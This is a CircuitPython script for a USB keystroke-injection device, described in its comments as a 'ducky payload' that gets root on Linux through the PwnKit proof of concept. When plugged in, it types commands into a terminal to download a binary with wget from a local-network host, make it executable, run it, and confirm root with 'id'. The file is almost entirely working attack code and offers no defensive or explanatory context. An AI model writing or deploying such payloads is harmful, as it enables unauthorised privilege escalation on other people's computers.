import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
from time import sleep


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# ducky payload starts here

# simple script to execute any command as root on linux using the (pwnkit) poc
# ---------------------------------------------------------------------------
sleep(4.0)
kbd.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
sleep(0.2)
layout.write(r'cd /tmp')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.1)
layout.write(r'wget http://192.168.1.2:12/pwnkit')
sleep(1.0)
kbd.send(Keycode.ENTER)
sleep(1.5)
layout.write(r'chmod +x pwnkit')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.1)
layout.write(r'./pwnkit')
sleep(0.15)
kbd.send(Keycode.ENTER)
sleep(0.2)
# root access starts here 
# ----------------------------
layout.write(r'id')
sleep(0.05)
kbd.send(Keycode.ENTER)
